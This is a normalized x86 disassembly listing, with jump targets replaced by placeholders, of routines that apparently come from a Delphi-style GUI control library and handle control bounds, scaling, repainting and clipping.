cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_43c59c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b644
mov eax ebx
call sub_43ecbc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43d400
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_404160
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43b644
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x164 ] 0x0
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx ebx [ esi + 0x61 ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
add edi eax
push edi
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edi eax
mov eax edi
lea ecx [ esp + 0x4 ]
pop edx
call sub_415348
mov eax [ esp ]
mov [ esi + 0x16d ] eax
mov eax [ esp + 0x4 ]
mov [ esi + 0x171 ] eax
movzx eax [ r-xdata ]
cmp al bl
jne r-xdata
adc eax 0x0
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x175 ] eax
xor eax eax
mov [ esi + 0x179 ] eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add edi eax
mov [ esi + 0x165 ] edi
adc eax 0x0
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add ebx eax
mov [ esi + 0x169 ] ebx
adc eax 0x0
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
lea ecx [ esi + 0x175 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
sub_43b7c8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x1
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov [ ebx + 0x180 ] eax
sub_43b7fc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx edx
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x2
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x44 ]
mov [ ebx + 0x184 ] eax
sub_43b830
push ebx
push esi
mov ebx eax
push edx
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x4
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x188 ] eax
sub_43b864
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
push edx
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x8
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x18c ] eax
sub_43b898
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x94 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43b9b8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp edi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
cmp edi eax
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_404160
test edi edi
je r-xdata
cmp [ eax + 0x1ac ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b9bf
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov [ ebp - 0x8 ] eax
cmp edi 0xffffffff
je r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax [ eax + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_416964
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_41dd70
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x94 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] edi
test edi edi
je r-xdata
cmp [ edi + 0x1ac ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov si 0xffbe
call sub_404160
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ edi + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_416668
sub_43b963
mov eax edi
mov si 0xffc4
call sub_404160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_41db30
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b9bf
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov si 0xffbe
call sub_404160
sub_43b9c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_43c59c
mov edx edi
mov eax ebx
call sub_43ba78
mov edx edi
mov eax ebx
call sub_43d4a8
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ba34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x15c ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
mov [ ebx + 0x158 ] 0x0
sub_43ba78
push ebx
push esi
push edi
mov ecx [ edx + 0x8 ]
mov esi [ edx ]
sub ecx esi
push ecx
mov ecx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ecx edi
push ecx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
retn
sub_43bacc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43baf8
mov edx eax
mov ecx esp
mov eax esi
call sub_415348
mov edx esp
mov eax ebx
call sub_43bfd4
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43bb10
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43bab4
mov ecx esp
mov edx esi
call sub_415348
mov edx esp
mov eax ebx
call sub_43bfd4
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43bb38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bbb9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bbc0
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
sub_43bbc8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43bbf4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x74 ]
mov ebp [ ebx + 0x14 ]
test ebp ebp
jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_43aaac
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_43aaac
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_43aaac
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_43aaac
sub_43bc78
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43bca4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_453454
sub_43bcd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0x94 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43d400
sub_43bd50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
movzx eax [ r-xdata ]
mov [ esi + 0x8c ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
movzx ebx [ r-xdata ]
movzx ebx [ esi + 0x8c ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x175 ]
push eax
call MulDiv
mov [ esi + 0x175 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x179 ]
push eax
call MulDiv
mov [ esi + 0x179 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43bbf4
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423950
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_42396c
sub_43bf30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43bfc6
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41dfcc
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43c148
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_405270
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bfcd
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43c178
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43bfd4
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43c01c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
test esi esi
je r-xdata
mov edx ebx
call sub_43fe9c
mov edx ebx
mov eax esi
call sub_43fda8
mov eax ebx
call sub_43b644
sub_43c068
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_404160
mov [ edi + 0x57 ] bl
push 0x0
movzx ecx bl
mov edx 0xb00b
mov eax edi
call sub_43d400
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_43c0fc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x80 ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_435648
mov edx ebx
mov eax esi
call sub_41db30
sub_43c124
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43d400
pop ebx
retn
sub_43c148
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43c0b8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404f34
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43c0c8
sub_43c178
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c1cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c148
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c1d4
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax esi
call sub_405324
mov edx eax
mov eax ebx
call sub_43c124
sub_43c1f8
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_4238ac
cmp eax [ ebx + 0x88 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43d400
pop ebx
retn
or [ ebx + 0x8c ] 0x10
mov eax [ ebx + 0x68 ]
call sub_4238ac
mov [ ebx + 0x88 ] eax
sub_43c380
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43c370
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_438f0c
mov eax esi
call sub_438f0c
jmp r-xdata
sub_43c3bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x1cc ]
mov edx ebx
call sub_416824
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x1cc ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4166b4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1cc ]
mov ecx ebx
mov edx esi
call sub_416844
mov cl 0x1
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_43c59c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_44e788
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd0
call sub_404160
sub_43c444
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43c3bc
mov edx [ ecx + 0x1cc ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43c3bc
jmp r-xdata
sub_43c468
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43c4fe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c505
lea eax [ ebp - 0xc ]
call sub_404e44
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
call sub_4047d8
sub_43c510
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x1cc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_416824
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4167c8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43ba58
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c59c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443f88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43ba58
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443be8
push eax
call InvalidateRect
push ebp
call sub_43c510
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43c63c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x2 ] 0x0
cmp [ eax + 0x12a ] 0x0
je r-xdata
movzx eax [ ebp - 0x2 ]
pop ebx
pop ecx
pop ebp
retn 0xc
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43c684
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_44e778
mov ebp eax
call sub_438ee4
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp ebp esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
retn
test ebp ebp
je r-xdata
cmp edi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43d400
mov edx [ esp ]
mov [ edx + 0xc ] eax
cmp edi ebp
je r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov edx [ esp ]
mov eax ebp
mov si 0xffc9
call sub_404160
jmp r-xdata
sub_43c71c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443f88
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443be8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43c7f5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_441730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443be8
push eax
call ReleaseDC
retn
sub_43c884
push ebx
push esi
push edi
add esp 0xffffffec
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ rw-data ]
call sub_448cc0
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor edx edx
